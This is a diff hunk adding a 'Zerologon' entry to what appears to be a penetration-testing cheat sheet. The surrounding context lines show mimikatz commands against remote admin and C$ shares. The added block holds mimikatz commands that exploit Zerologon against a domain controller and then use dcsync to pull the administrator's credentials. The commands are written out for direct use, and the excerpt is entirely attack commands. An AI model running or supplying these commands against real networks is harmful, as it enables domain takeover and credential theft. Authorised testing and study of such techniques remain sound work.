@@ -5089,6 +5089,13 @@ net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 ```
 
+##### Zerologon
+
+```c
+"lsadump::zerologon /target:IP /account:DC_NAME$ /exploit" exit //exploit
+"lsadump::dcsync /domain:DOMAIN_NAME /user:administrator /authuser:DC_NAME$ /authdomain:main /authpassword:"" /authntlm" exit
+```
+
 #### NetExec
 
 ```c
